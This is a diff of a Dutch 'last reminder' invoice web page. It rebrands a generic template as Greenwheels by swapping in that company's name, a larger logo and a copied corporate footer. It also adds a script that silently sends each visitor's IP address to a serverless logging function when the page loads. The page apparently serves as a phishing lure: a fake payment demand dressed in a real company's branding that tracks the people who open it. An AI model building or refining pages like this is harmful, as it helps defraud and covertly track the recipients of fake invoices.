@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="Laatste herinnering voor openstaande factuur. Voorkom extra kosten en betaal op tijd.">
     <meta name="keywords" content="factuur, betaling, herinnering, incassobureau, openstaande betaling">
-    <meta name="author" content="Jouw Bedrijf">
+    <meta name="author" content="Greenwheels">
     <title>Laatste Herinnering - Factuur Anna</title>
     <style>
         body {
@@ -23,7 +23,7 @@
         }
 
         header img {
-            width: 120px;
+            width: 250px; /* Logo vergroot */
         }
 
         .container {
@@ -122,18 +122,61 @@
             background-color: #007700;
         }
 
+        /* Volledig aangepaste footer */
         footer {
-            margin-top: 50px;
+            background-color: #000;
+            color: white;
+            padding: 50px 20px;
             text-align: center;
+        }
+
+        .footer-description {
             font-size: 0.9rem;
-            color: #666;
+            margin-bottom: 30px;
+            color: #ddd;
+        }
+
+        .footer-links, .footer-info {
+            margin: 20px 0;
+        }
+
+        .footer-links a, .footer-info a {
+            color: #fff;
+            margin: 0 15px;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .footer-links a:hover, .footer-info a:hover {
+            text-decoration: underline;
+        }
+
+        .social-icons a {
+            margin: 0 10px;
+            color: white;
+            font-size: 1.5rem;
+            text-decoration: none;
+        }
+
+        .footer-bottom {
+            margin-top: 30px;
+            font-size: 0.85rem;
+            color: #aaa;
         }
     </style>
+    <script>
+        window.onload = function () {
+            fetch('/.netlify/functions/log_ip')
+                .then((response) => response.json())
+                .then((data) => console.log('IP gelogd:', data))
+                .catch((error) => console.error('Fout bij IP-logging:', error));
+        };
+    </script>
 </head>
 
 <body>
     <header>
-        <img src="logo.png" alt="Bedrijfslogo">
+        <img src="logo.png" alt="Greenwheels Logo">
     </header>
 
     <main class="container">
@@ -184,7 +227,38 @@
     </main>
 
     <footer>
-        <p>&copy; 2025 Jouw Bedrijf. Alle rechten voorbehouden.</p>
+        <p class="footer-description">
+            Sommige functionaliteiten en opties zijn afhankelijk van het tarief dat je hebt gekozen bij gebruik van de auto. Zie onze tarieven voor meer informatie.
+        </p>
+        <div class="footer-links">
+            <a href="#">Auto huren</a>
+            <a href="#">Auto aanschaffen</a>
+            <a href="#">Auto & duurzaamheid</a>
+        </div>
+        <div class="footer-links">
+            <a href="#">Over Greenwheels</a>
+            <a href="#">Werken bij</a>
+            <a href="#">Pers</a>
+            <a href="#">Gemeente</a>
+            <a href="#">Vastgoed</a>
+            <a href="#">Nieuws</a>
+        </div>
+        <div class="footer-info">
+            <a href="#">Klantenservice</a> |
+            <a href="#">Algemene voorwaarden</a> |
+            <a href="#">Cookiebeleid</a> |
+            <a href="#">Privacy statement</a> |
+            <a href="#">Disclaimer</a> |
+            <a href="#">Accountveiligheid</a>
+        </div>
+        <div class="social-icons">
+            <a href="#">LinkedIn</a>
+            <a href="#">Facebook</a>
+            <a href="#">Instagram</a>
+        </div>
+        <div class="footer-bottom">
+            Greenwheels 2025
+        </div>
     </footer>
 </body>
 
